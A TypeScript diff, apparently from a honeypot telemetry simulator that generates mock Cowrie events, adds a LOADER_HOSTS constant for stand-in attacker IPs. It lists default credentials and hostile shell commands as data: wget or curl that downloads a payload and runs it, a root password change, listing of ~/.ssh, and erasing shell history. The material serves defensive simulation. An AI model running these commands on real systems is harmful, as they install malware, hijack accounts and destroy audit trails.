@@ -83,16 +83,21 @@ const MOORLAND = 'Moorland Grid Distribution'
 
 export const USERNAMES = ['root', 'admin', 'ubuntu', 'user', 'test', 'oracle', 'pi', 'postgres', 'git', 'support', 'guest', 'ftpuser'] as const
 export const PASSWORDS = ['123456', 'admin', 'password', 'root', '12345678', 'qwerty', '1234', 'P@ssw0rd', 'raspberry', 'admin123', 'toor', '111111'] as const
+/** Where the dropper commands fetch their payloads from: two of the
+ * attacking sources, as Mirai-style loaders serve their own bins. A sandbox
+ * detonation that connects back to one confirms that source malicious. */
+export const LOADER_HOSTS = ['198.51.100.22', '203.0.113.251'] as const
+
 export const COMMANDS = [
   'uname -a',
   'cat /proc/cpuinfo | grep name | wc -l',
-  'cd /tmp; wget http://198.51.100.23/bins.sh; chmod +x bins.sh; ./bins.sh',
+  `cd /tmp; wget http://${LOADER_HOSTS[0]}/bins.sh; chmod +x bins.sh; ./bins.sh`,
   'echo "root:Xk2j9" | chpasswd',
   'nproc',
   'ls -la ~/.ssh',
   'free -m',
   'crontab -l',
-  'curl -s http://203.0.113.9/x | sh',
+  `curl -s http://${LOADER_HOSTS[1]}/x | sh`,
   'history -c; rm -rf ~/.bash_history',
 ] as const
 
@@ -248,7 +253,7 @@ export const FLEET: SensorSpec[] = [
       }
       if (roll > 0.985) {
         const shasum = hex(rng, 64)
-        const url = pick(rng, ['http://198.51.100.23/bins.sh', 'http://203.0.113.9/x', 'http://192.0.2.44/mips'])
+        const url = pick(rng, [`http://${LOADER_HOSTS[0]}/bins.sh`, `http://${LOADER_HOSTS[1]}/x`, 'http://192.0.2.44/mips'])
         return { type: 'file.download', severity: 'critical', protocol, dstPort, eventName: 'cowrie.session.file_download', summary: `Payload fetched (sha256 ${shasum.slice(0, 12)}…)`, fields: { ...base, eventid: 'cowrie.session.file_download', url, shasum, outfile: `var/lib/cowrie/downloads/${shasum}`, message: `Downloaded URL (${url}) with SHA-256 ${shasum}`, canonical_attck_techniques: ['T1105'] } }
       }
       if (protocol === 'ssh' && roll < 0.79) {
